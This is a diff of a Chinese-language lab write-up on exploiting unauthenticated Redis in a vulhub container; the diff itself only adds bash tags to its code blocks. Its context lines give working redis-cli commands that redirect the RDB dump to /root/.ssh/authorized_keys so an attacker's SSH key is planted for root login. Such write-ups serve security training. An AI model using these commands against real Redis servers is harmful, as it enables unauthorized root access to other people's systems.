@@ -26,13 +26,13 @@ yum install -y redis
 （图片太长，只截图前半段）最后出现Complete安装完成
 
 1. 使用 redis‑cli 客户端直接连接目标
-```
+```bash
 redis‑cli -h 靶机IP -p 端口
 
 redis‑cli -h 10.165.15.225 -p 6379
 ```
 2. 连接成功后执行 info 命令
-```
+```bash
 info
 ```
 ![漏洞现象图片1](images/5.png)
@@ -42,7 +42,7 @@ info
 漏洞现象：没有密码校验，可以看到 redis 版本、操作系统等信息，说明已经成功进入 Redis，存在未授权访问
 
 3. 可以获取全部 keyspace 数据
-```
+```bash
 当前环境没有存入任何数据，所以keyspace后面没有任何数据
 ```
 ## 测试能否写入
@@ -52,7 +52,7 @@ info
 ![测试](images/6.png)
 
 
-···
+···bash
 config get dir           # 当前数据存储目录：/data
 config get dbfilename    # 当前 RDB 文件名：dump.rdb
 config set dir /tmp      # 将数据存储目录改为 /tmp
@@ -65,7 +65,7 @@ bgsave      # 触发持久化（写入磁盘）
 
 
 ## 漏洞利用：写入 SSH 公钥提权
-```
+```bash
 config set dir /root/.ssh
 config set dbfilename "authorized_keys"
 set x "\n\nssh‑rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...\n\n"
@@ -75,7 +75,7 @@ save 执行成功，公钥写入靶机信任文件，可直接 ssh 登录服务�
 
 
 ## 销毁靶场
-```
+```bash
 cd vulhub/redis/4-unacc
 docker‑compose down
 ```
